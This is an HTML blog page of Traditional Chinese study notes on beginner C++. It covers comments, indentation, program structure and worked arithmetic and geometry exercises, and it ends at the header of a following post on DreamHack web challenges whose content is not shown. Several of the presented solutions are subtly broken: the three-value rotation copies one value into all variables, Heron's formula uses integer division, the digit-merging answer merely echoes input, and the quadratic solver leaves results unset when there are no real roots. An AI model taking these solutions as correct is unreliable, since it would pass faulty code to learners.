<h4 id="前者因為可超過兩列，較適合編寫較長的註解"><a href="#前者因為可超過兩列，較適合編寫較長的註解" class="headerlink" title="&#x3D;&#x3D;前者因為可超過兩列，較適合編寫較長的註解&#x3D;&#x3D;"></a>&#x3D;&#x3D;前者因為可超過兩列，較適合編寫較長的註解&#x3D;&#x3D;</h4><h4 id="後者僅能寫在同一列"><a href="#後者僅能寫在同一列" class="headerlink" title="&#x3D;&#x3D;後者僅能寫在同一列&#x3D;&#x3D;"></a>&#x3D;&#x3D;後者僅能寫在同一列&#x3D;&#x3D;</h4><hr>
<h3 id="縮排與空行"><a href="#縮排與空行" class="headerlink" title="縮排與空行"></a>縮排與空行</h3><p><code>除了適當的註解，程式設計應善用縮排與空行，才可以使程式讓人易於閱讀 因為有了縮排，程式才有了層次感，其次，空行則可使段落更加明顯</code></p>
<h4 id="程式架構介紹"><a href="#程式架構介紹" class="headerlink" title="程式架構介紹"></a>程式架構介紹</h4><p><strong>C&#x2F;C++程式架構如下:</strong></p>
<h4 id="大致分為四大區塊，分別是"><a href="#大致分為四大區塊，分別是" class="headerlink" title="大致分為四大區塊，分別是"></a><font color="#f18">大致分為四大區塊，分別是</font></h4><ul>
<li>函式引用區</li>
<li>宣告區(類別、函式、全域變數宣告區)</li>
<li>主程式區</li>
<li>類別、函式實作區</li>
</ul>
<table>
<thead>
<tr>
<th align="center">編號</th>
<th align="center">標題</th>
<th align="left">程式</th>
</tr>
</thead>
<tbody><tr>
<td align="center">一</td>
<td align="center">函式引用區(引入所需標頭檔)</td>
<td align="left">#include <iostream>、#include&lt;math.h&gt;</td>
</tr>
<tr>
<td align="center">二</td>
<td align="center">命名空間、類別、函式、全域變數宣告區</td>
<td align="left">using namespace std; <br>int add(int a,int b);<br>int c;</td>
</tr>
<tr>
<td align="center">三</td>
<td align="center">主程式區main()</td>
<td align="left">int main(){ <br>c&#x3D;add(6,2);<br> cout&lt;&lt;c; <br>return 0;<br> }</td>
</tr>
<tr>
<td align="center">四</td>
<td align="center">類別、函式實作區</td>
<td align="left">int add(int a,int b){<br>int c;<br> c&#x3D;a+b;<br> return ( c );<br>}</td>
</tr>
</tbody></table>
<h2 id="範例程式-9"><a href="#範例程式-9" class="headerlink" title="範例程式"></a>範例程式</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;math.h&gt;</span><span class="comment">//函式引用區</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;<span class="comment">//命名空間、類別、函式、全域變數宣告區</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">add</span><span class="params">(<span class="type">int</span> a,<span class="type">int</span> b)</span></span>;<span class="comment">//函式宣告</span></span><br><span class="line"><span class="type">int</span> c;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;  <span class="comment">//主程式區</span></span><br><span class="line">    c=<span class="built_in">add</span>(<span class="number">6</span>,<span class="number">4</span>); <span class="comment">//6+4</span></span><br><span class="line">    cout&lt;&lt;c; <span class="comment">//10</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">add</span><span class="params">(<span class="type">int</span> a,<span class="type">int</span> b)</span></span>&#123;<span class="comment">//類別或函式實作區</span></span><br><span class="line">    <span class="type">int</span> c; </span><br><span class="line">    c=a+b; </span><br><span class="line">    <span class="keyword">return</span> (c);</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="但是函式、類別實作區若與主程式區調換，則函式與類別不用宣告"><a href="#但是函式、類別實作區若與主程式區調換，則函式與類別不用宣告" class="headerlink" title="但是函式、類別實作區若與主程式區調換，則函式與類別不用宣告"></a>但是函式、類別實作區若與主程式區調換，則函式與類別不用宣告</h4><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;math.h&gt;</span><span class="comment">//函式引用區</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;<span class="comment">//命名空間、類別、函式、全域變數宣告區</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">add</span><span class="params">(<span class="type">int</span> a,<span class="type">int</span> b)</span></span>;<span class="comment">//函式宣告</span></span><br><span class="line"><span class="type">int</span> c;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">add</span><span class="params">(<span class="type">int</span> a,<span class="type">int</span> b)</span></span>&#123;<span class="comment">//類別或函式實作區 //a,b不可省略</span></span><br><span class="line">    <span class="type">int</span> c; </span><br><span class="line">    c=a+b; </span><br><span class="line">    <span class="keyword">return</span> (c);   </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;  <span class="comment">//主程式區</span></span><br><span class="line">    c=<span class="built_in">add</span>(<span class="number">6</span>,<span class="number">4</span>); <span class="comment">//6+4</span></span><br><span class="line">    cout&lt;&lt;c; <span class="comment">//10</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<pre><code>兩種寫法輸出都是10
</code></pre>
<h1 id="實例應用"><a href="#實例應用" class="headerlink" title="實例應用"></a>實例應用</h1><p>&#x3D;&#x3D;<strong>記得要自己想過寫過呦</strong>&#x3D;&#x3D;</p>
<h4 id="第一題"><a href="#第一題" class="headerlink" title="第一題"></a>第一題</h4><p><code>試寫一程式，可輸入長方形的長與寬，並計算周長與面積</code><br>:::info<br>長方形面積公式&gt;&gt;長乘寬<br>長方形周長公式&gt;&gt;2(長加寬)<br>:::</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> a,b,c,d;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;Input length and width:&quot;</span>;</span><br><span class="line">    cin &gt;&gt;a&gt;&gt;b;<span class="comment">//a為長、b為寬 </span></span><br><span class="line">    c = <span class="number">2</span>*(a+b); <span class="comment">//周長</span></span><br><span class="line">    d = a*b;<span class="comment">//面積</span></span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;c=&quot;</span>&lt;&lt;c&lt;&lt;endl;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;d=&quot;</span>&lt;&lt;d&lt;&lt;endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="第二題"><a href="#第二題" class="headerlink" title="第二題"></a>第二題</h4><p><code>輸入長方體長寬高計算表面積與體積</code><br>:::success<br>長方體表面積&#x3D;(長x寬+寬x高+高x長)x2<br>長方體的體積公式&#x3D;長×寬×高<br>:::</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> a,b,c;<span class="comment">//長:a 寬:b 高:c</span></span><br><span class="line">    <span class="type">int</span> x,y;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;Input length, width and height&quot;</span>;</span><br><span class="line">    cin&gt;&gt;a&gt;&gt;b&gt;&gt;c;</span><br><span class="line">    x=(a*b+b*c+c*a)*<span class="number">2</span>;<span class="comment">//面積</span></span><br><span class="line">    y=a*b*c;<span class="comment">//體積</span></span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;rectangular Volume=&quot;</span>&lt;&lt;y&lt;&lt;endl;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;rectangular area=&quot;</span>&lt;&lt;x;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="第三題"><a href="#第三題" class="headerlink" title="第三題"></a>第三題</h4><p><strong>試寫一程式，滿足以下條件<br>1.可以輸入兩個座標<br>2.計算兩點座標距離<br>3.輸出此兩點距離</strong></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> x1,x2,y1,y2;</span><br><span class="line">    <span class="type">double</span> d;<span class="comment">//距離</span></span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;input x1,x2,y1,y2&quot;</span>&lt;&lt;endl;</span><br><span class="line">    cin&gt;&gt;x1&gt;&gt;x2&gt;&gt;y1&gt;&gt;y2;</span><br><span class="line">    d=<span class="built_in">sqrt</span>(<span class="built_in">pow</span>((x1-x2),<span class="number">2</span>)+<span class="built_in">pow</span>((y1-y2),<span class="number">2</span>)); <span class="comment">//pow是次方 sqrt是開根號</span></span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;The distance of the two points is:&quot;</span>&lt;&lt;d&lt;&lt;endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="第四題"><a href="#第四題" class="headerlink" title="第四題"></a>第四題</h4><p><strong>試寫一程式，可輸入三角形三邊長a、b、c求面積</strong></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> a,b,c;</span><br><span class="line">    <span class="type">double</span> d,e;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;Input triangle &quot;</span>&lt;&lt;endl;</span><br><span class="line">    cin&gt;&gt;a&gt;&gt;b&gt;&gt;c;</span><br><span class="line">    d=(a+b+c)/<span class="number">2</span>;</span><br><span class="line">    e=<span class="built_in">sqrt</span>(d*(d-a)*(d-b)*(d-c));</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;The triangle area is:&quot;</span>&lt;&lt;e&lt;&lt;endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&#x3D;&#x3D;這裡補充一下演算法則&#x3D;&#x3D;<br><strong>兩個數要交換，就如同兩杯水要交換<br>假設你有兩個杯子的水(分別為糖水a、鹽水b)，交換其內容，方法如下</strong></p>
<blockquote>
<p>1.先找來空杯子t<br>2.將a杯子的水倒入t杯子<br>t&#x3D;a;<br>3.將b杯子的水倒入a杯子<br>a&#x3D;b;<br>4.將t杯子倒入b杯子，而完成兩杯子的交換<br>b&#x3D;t;[color&#x3D;#a53]</p>
</blockquote>
<p><strong>其次，若未先找來空杯子t，而直接將b杯子的水往a杯子倒，再將a杯子的水往b杯子倒</strong></p>
<blockquote>
<p>a&#x3D;b;<br>b&#x3D;a;[color&#x3D;#f46]</p>
</blockquote>
<p><strong>則執行a&#x3D;b時，如果這時a杯中糖水已經沒了，此時在執行b&#x3D;a，會出現錯誤結果</strong></p>
<h4 id="第五題"><a href="#第五題" class="headerlink" title="第五題"></a>第五題</h4><blockquote>
<p>試寫一程式，滿足以下條件<br>1.可以輸入兩個數字<br>2.交換此兩個數字<br>3.輸出交換的結果<br>[color&#x3D;#f50]</p>
</blockquote>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">  <span class="type">int</span> a,b,z;</span><br><span class="line">  <span class="comment">//cout&lt;&lt;&quot;Input 2 digit:&quot;&lt;&lt;endl;</span></span><br><span class="line">  <span class="comment">//cin&gt;&gt;a&gt;&gt;b;  //試比較兩種輸入輸出</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;input a:&quot;</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;a);<span class="comment">// %d是整數 &amp;取得a變數位址</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;input b:&quot;</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;b);</span><br><span class="line"></span><br><span class="line">  z=a;</span><br><span class="line">  a=b;</span><br><span class="line">  b=z;</span><br><span class="line"></span><br><span class="line"><span class="comment">//cout&lt;&lt;&quot;Exchange import numerical a,b aftermath:&lt;&lt;endl&lt;&lt;&quot;a=&quot;&lt;&lt;a&lt;&lt;endl&lt;&lt;&quot;b=&quot;&lt;&lt;b&lt;&lt;endl;</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;after swap a=%d b=%d&quot;</span>,a,b);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="第六題"><a href="#第六題" class="headerlink" title="第六題"></a>第六題</h4><p><strong>試寫一程式，可以輸入三個數，並將1交給2、2交給3、3交給1並輸出三個數的結果</strong></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> a,b,c; <span class="comment">//a&gt;&gt;1,b&gt;&gt;2,c&gt;&gt;3</span></span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;input 3 numberal:&quot;</span>&lt;&lt;endl;</span><br><span class="line">    cin&gt;&gt;a&gt;&gt;b&gt;&gt;c;</span><br><span class="line">    b=a;</span><br><span class="line">    c=b;</span><br><span class="line">    a=c;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Exchange import numerical a,b,c aftermath: a=%d b=%d c=%d &quot;</span>,a,b,c);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;    </span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//輸出結果有接力棒的fu</span></span><br></pre></td></tr></table></figure>

<h4 id="第七題"><a href="#第七題" class="headerlink" title="第七題"></a>第七題</h4><p><strong>假設某次考試成績如下55、66、77、88、99</strong></p>
<blockquote>
<p>1.試寫一程式輸入以上資料<br>2.輸入以上資料<br>3.計算總和<br>4.輸出總和與平均[color&#x3D;#f568]</p>
</blockquote>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">   <span class="type">int</span> a,b,c,d,e;</span><br><span class="line">   <span class="type">double</span> x,y;</span><br><span class="line">   a=<span class="number">55</span>;</span><br><span class="line">   b=<span class="number">66</span>;</span><br><span class="line">   c=<span class="number">77</span>;</span><br><span class="line">   d=<span class="number">88</span>;</span><br><span class="line">   e=<span class="number">99</span>;</span><br><span class="line">   <span class="comment">//cout&lt;&lt;&quot;input 5 achievement&quot;&lt;&lt;endl;//如果是手動輸入成績的話</span></span><br><span class="line">   <span class="comment">//cin&gt;&gt;a&gt;&gt;b&gt;&gt;c&gt;&gt;d&gt;&gt;e;</span></span><br><span class="line">   x=a+b+c+d+e;</span><br><span class="line">   y=x/<span class="number">5</span>;</span><br><span class="line">   cout&lt;&lt;<span class="string">&quot;sum = &quot;</span>&lt;&lt;x&lt;&lt;endl;</span><br><span class="line">   cout&lt;&lt;<span class="string">&quot;averagely = &quot;</span>&lt;&lt;y;</span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="補充一下-danger如果遇到大量需要輸入的資料千萬不要這樣一個一個慢慢輸入呦想知道如何撰寫這樣的程式，會在迴圈與陣列的章節說到-第八題-兩點式，兩點可決定一直線-ax-by-c-0-試寫一程式，可輸入兩個二為座標，並求出此直線方程式-例如-輸入-2-1-、-4、6-則直線方程式為5x-2y-8-0-應用複習"><a href="#補充一下-danger如果遇到大量需要輸入的資料千萬不要這樣一個一個慢慢輸入呦想知道如何撰寫這樣的程式，會在迴圈與陣列的章節說到-第八題-兩點式，兩點可決定一直線-ax-by-c-0-試寫一程式，可輸入兩個二為座標，並求出此直線方程式-例如-輸入-2-1-、-4、6-則直線方程式為5x-2y-8-0-應用複習" class="headerlink" title="&#x3D;&#x3D;補充一下&#x3D;&#x3D;:::danger如果遇到大量需要輸入的資料千萬不要這樣一個一個慢慢輸入呦想知道如何撰寫這樣的程式，會在迴圈與陣列的章節說到:::#### 第八題 兩點式，兩點可決定一直線(ax+by+c&#x3D;0) 試寫一程式，可輸入兩個二為座標，並求出此直線方程式 例如:輸入(2,1)、(4、6)則直線方程式為5x-2y-8&#x3D;0 應用複習"></a>&#x3D;&#x3D;補充一下&#x3D;&#x3D;<br>:::danger<br>如果遇到大量需要輸入的資料千萬不要這樣一個一個慢慢輸入呦<br>想知道如何撰寫這樣的程式，會在迴圈與陣列的章節說到<br>:::<br>#### 第八題<br><br> <strong>兩點式，兩點可決定一直線(ax+by+c&#x3D;0)<br> 試寫一程式，可輸入兩個二為座標，並求出此直線方程式</strong><br> <em><strong>例如:輸入(2,1)、(4、6)則直線方程式為5x-2y-8&#x3D;0</strong></em><br> <figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> x1,y1,x2,y2;</span><br><span class="line">    <span class="type">int</span> a,b,c,x,y;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;input x1,y1&quot;</span>&lt;&lt;endl;</span><br><span class="line">    cin&gt;&gt;x1&gt;&gt;y1;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;input x2,y2&quot;</span>&lt;&lt;endl;</span><br><span class="line">    cin&gt;&gt;x2&gt;&gt;y2;</span><br><span class="line">    x=x2-x1;</span><br><span class="line">    y=y2-y1;</span><br><span class="line">    a=y;</span><br><span class="line">    b=-x;</span><br><span class="line">    c=-y*x1+x*y1;</span><br><span class="line">    cout&lt;&lt;a&lt;&lt;<span class="string">&quot;x+&quot;</span>&lt;&lt;b&lt;&lt;<span class="string">&quot;y+&quot;</span>&lt;&lt;c&lt;&lt;<span class="string">&quot;=0&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><br>應用複習</h1><p><strong>1.試寫一程式，可輸入一個一元二次方程式，求解(設本例假設方程式有二解)</strong><br>:::info<br>◎用公式法解一元二次方程式 ax^2 + bx + c &#x3D; 0 的步驟如下：<br>(一) 找出二次項係數 a，一次項係數 b，常數項 c。<br>(二) 算出 b^2－4ac 的值。<br>(三) 若 b^2－4ac &gt; 0，則 x &#x3D;−𝑏±√𝑏^2−4𝑎𝑐&#x2F;2𝑎<br>若 b^2－4ac &#x3D; 0，則 x &#x3D;−𝑏&#x2F;2𝑎(重根) 。<br>若 b^2－4ac &lt; 0，則 x 無解。(在國中階段無解)</p>
<p>:::<br>&#x3D;&#x3D;範例輸出2x^2-7x+3&#x3D;0，x1&#x3D;3,x2&#x3D;0.5&#x3D;&#x3D;</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">double</span> a,b,c,d;</span><br><span class="line">    <span class="type">double</span> x1,x2,com;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;input abc &quot;</span>&lt;&lt;endl;</span><br><span class="line">    cin&gt;&gt;a&gt;&gt;b&gt;&gt;c;</span><br><span class="line"> <span class="comment">//   0==(pow((a*x1),2))+(b*x2)+c;</span></span><br><span class="line">    <span class="keyword">if</span> (b*b<span class="number">-4</span>*a*c&gt;<span class="number">0</span>)&#123;</span><br><span class="line">      d=<span class="built_in">sqrt</span>(b*b<span class="number">-4</span>*a*c);</span><br><span class="line">       x1=(-b+d)/(<span class="number">2</span>*a);</span><br><span class="line">         x2=(-b-d)/(<span class="number">2</span>*a);</span><br><span class="line">    &#125;</span><br><span class="line">               </span><br><span class="line">    <span class="keyword">if</span> (b*b<span class="number">-4</span>*a*c==<span class="number">0</span>)&#123;</span><br><span class="line">  <span class="comment">//    d2=sqrt(b*b-4*a*c);</span></span><br><span class="line">       x1=-b/(<span class="number">2</span>*a);</span><br><span class="line">         x2=-b/(<span class="number">2</span>*a);</span><br><span class="line">    &#125;</span><br><span class="line">           </span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;x1=&quot;</span>&lt;&lt;x1&lt;&lt;endl;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;x2=&quot;</span>&lt;&lt;x2;  </span><br><span class="line">&#125; </span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><strong>2.試寫一程式，可以輸入一個二元一次方程式，求其解(本例假設方程式洽有一解)</strong><br>&#x3D;&#x3D;提示:使用克拉瑪公式&#x3D;&#x3D;</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">double</span> a1,a2,b1,b2,c1,c2,d;</span><br><span class="line">    <span class="type">double</span> x,y;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;input a1_b1_c1_a2_b2_c2&quot;</span>&lt;&lt;endl;</span><br><span class="line">    cin&gt;&gt;a1&gt;&gt;b1&gt;&gt;c1&gt;&gt;a2&gt;&gt;b2&gt;&gt;c2;</span><br><span class="line"><span class="comment">// c1=((a1*x)+(b1*y));</span></span><br><span class="line"> <span class="comment">//   c2=((a2*x)+(b2*y));</span></span><br><span class="line"></span><br><span class="line">    d=((a1*b2)-a2*b1);</span><br><span class="line">    x=((c1*b2)-c2*b1)/d;</span><br><span class="line">    y=((a1*c2)-a2*c1)/d;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;x=&quot;</span>&lt;&lt;x&lt;&lt;endl;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;y=&quot;</span>&lt;&lt;y&lt;&lt;endl;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>3.試寫一程式，可以輸入一個三元一次方程式，並求其解(本例假設所輸入的方程式洽有一解)</strong></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="comment">//#include&lt;cmath&gt;</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">double</span> a1,a2,a3,b1,b2,b3,c1,c2,c3;</span><br><span class="line">    <span class="type">double</span> d1,d2,d3,e,x,y,z;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;input a1_b1_c1_d1_a2_b2_c2_d2_a3_b3_c3_d3&quot;</span>&lt;&lt;endl;</span><br><span class="line">    cin&gt;&gt;a1&gt;&gt;b1&gt;&gt;c1&gt;&gt;d1&gt;&gt;a2&gt;&gt;b2&gt;&gt;c2&gt;&gt;d2&gt;&gt;a3&gt;&gt;b3&gt;&gt;c3&gt;&gt;d3;</span><br><span class="line">    e=((a1*b2*c3)+(a2*b3*c1)+(a3*b1*c2)-(a3*b2*c1)-(b3*c2*a1)-(c3*b1*a2));</span><br><span class="line">    z=((a1*b2*d3)+(b1*d2*a3)+(d1*b3*a2)-(d1*b2*a3)-(d2*b3*a1)-(d3*b1*a2))/e;</span><br><span class="line">    x=((d1*b2*c3)+(b1*c2*d3)+(c1*b3*d2)-(c1*b2*d3)-(c2*b3*d1)-(c3*d2*b1))/e;</span><br><span class="line">    y=((a1*d2*c3)+(d1*c2*a3)+(c1*d3*a2)-(c1*d2*a3)-(c2*d3*a1)-(c3*d1*a2))/e;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;x=&quot;</span>&lt;&lt;x&lt;&lt;endl;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;y=&quot;</span>&lt;&lt;y&lt;&lt;endl;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;z=&quot;</span>&lt;&lt;z;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>4.計算自由落體的距離與時間關係，公式為d&#x3D;v0t+gt^2&#x2F;2</strong></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">double</span> v0,t,g,d;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;input v0,t,g&quot;</span>&lt;&lt;endl;</span><br><span class="line">    cin&gt;&gt;v0&gt;&gt;t&gt;&gt;g;</span><br><span class="line">    d=v0*t+(g*t*t)/<span class="number">2</span>;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;d=&quot;</span>&lt;&lt;d;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>5.請分別輸入1個0到9的整數，並將它合併為1個整數</strong><br>&#x3D;&#x3D;例如:輸入1、2、3、4則輸出1234&#x3D;&#x3D;</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"> </span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    cin&gt;&gt;i;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;your input is:&quot;</span>&lt;&lt;i&lt;&lt;endl;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>






  
    <article id="post-Dreamhack_web1" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2024/12/21/Dreamhack_web1/" class="article-date">
  	<time datetime="2024-12-21T12:32:07.080Z" itemprop="datePublished">2024-12-21</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2024/12/21/Dreamhack_web1/">
        DreamHack Web Part1
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
